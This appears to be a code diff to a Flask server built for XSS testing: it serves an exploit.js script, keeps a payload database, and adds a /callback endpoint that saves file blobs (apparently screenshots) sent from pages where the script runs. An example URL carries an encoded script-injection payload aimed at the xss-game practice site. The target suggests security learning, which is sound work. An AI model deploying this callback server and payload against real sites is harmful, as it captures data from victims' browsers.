@@ -29,21 +29,22 @@ CORS(app, resources={
 })
 
 # Path to the exploit.js file for debugging purposes
-EXPLOIT_FILE_PATH = os.path.abspath("templates/exploit/exploit.js")
-app.config['CURRENT_FILE'] = 'exploit.js'
+EXPLOIT_FILE_PATH = os.path.abspath("../templates/exploit/test-exploit.js")
+app.config['CURRENT_FILE'] = 'test-exploit.js'
 
 print(os.path.abspath('static/exploit.js'))
 
 def setup():
     initialize_db()
 
-@app.route("/")
-def returnExploit():
-    # Log the full path for debugging
-    file_path = os.path.abspath("templates/exploit/exploit.js")
-    print(f"Looking for file at: {file_path}")
-app.secret_key = 'your_secret_key'  # Needed for session handling
-logging.basicConfig(level=logging.INFO)
+# @app.route("/")
+# def returnExploit():
+#     # Log the full path for debugging
+#     file_path = os.path.abspath("./templates/exploit/exploit.js")
+#     print(f"Looking for file at: {file_path}")
+# app.secret_key = 'your_secret_key'  # Needed for session handling
+# # logging.basicConfig(level=logging.INFO)
+
 
 
 @app.before_request
@@ -58,9 +59,9 @@ def serve_file():
     current_file = app.config['CURRENT_FILE']
 
     # Define the path to the requested file
-    base_directory = os.path.abspath("templates/exploit") 
+    base_directory = os.path.abspath("./templates/exploit/") 
     file_path = os.path.join(base_directory, current_file)
-
+    
     # Security: Prevent directory traversal
     if not file_path.startswith(base_directory):
         abort(403)  # Forbidden
@@ -153,23 +154,46 @@ def select_exploit_page():
 
 @app.route('/callback', methods=['POST'])
 def handle_callback():
-    data = request.get_json()
-    if data is None:
-        return jsonify({'error': 'Invalid JSON'}), 400
+    # Retrieve the file from the request
+    file = request.files.get('fileBlob')
+    print("request is:")
+    print(request)
+    url = request.form.get('url') #hier moet iets aan toegevoegd worden!!!
+    print(url)
+    url = extract_hostname(url)
+    print(url)
+    # Generate the next incremented filename
+    existing_files = os.listdir('./Triggers')
+    png_files = [f for f in existing_files if f.endswith('.png')]
+    next_index = len(png_files) + 1
+    new_filename = f"{url}{next_index}.png"
+    save_path = os.path.join('./Triggers', new_filename)
+    
+    # Save the file as a .png
+    file.save(save_path)
+    print(f"File saved to {save_path}")
+    
+    return jsonify({'status': 'Callback received', 'filename': new_filename}), 200
 
-    app.logger.info(f"Received callback: {data}")
+def extract_hostname(url):
+    # Find the position of '://', which separates the scheme from the rest of the URL
+    start_index = url.find('://') + 3  # Skip past '://'
+    
+    # Find the position of the first '/' after the '://'
+    end_index = url.find('/', start_index)
+    
+    # If there is no '/', we take the rest of the URL as the hostname
+    if end_index == -1:
+        return url[start_index:]
+    
+    # Extract and return the hostname
+    return url[start_index:end_index]
 
-    event = data.get('event')
-    location = data.get('location')
-    timestamp = data.get('timestamp')
+# Example usage
+url = "https://xss-game.appspot.com/level1/frame?query=%3Cscript+src%3D%22http%3A%2F%2F127.0.0.1%3A5000%2F%22%3E%3C%2Fscript%3E"
+hostname = extract_hostname(url)
 
-    print(f"Event: {event}")
-    print(f"Location: {location}")
-    print(f"Timestamp: {timestamp}")
-
-    return jsonify({'status': 'Callback received'}), 200
-
-
+print(f"Hostname: {hostname}")
 
 def send_request():
     r = requests.get("https://example.com/")
@@ -185,10 +209,10 @@ def get_page_content(url):
     return r.text
 
 if __name__ == '__main__':
-    initialize_db()  # Ensure the table exists
-    populate_payloads()  # Insert payloads into the database
-    payloads = fetch_payloads()  # Fetch and print all payloads
-    for payload in payloads:
-        print(payload)
+    # initialize_db()  # Ensure the table exists
+    # populate_payloads()  # Insert payloads into the database
+    # payloads = fetch_payloads()  # Fetch and print all payloads
+    # for payload in payloads:
+    #     print(payload)
     app.run(debug=True)
 
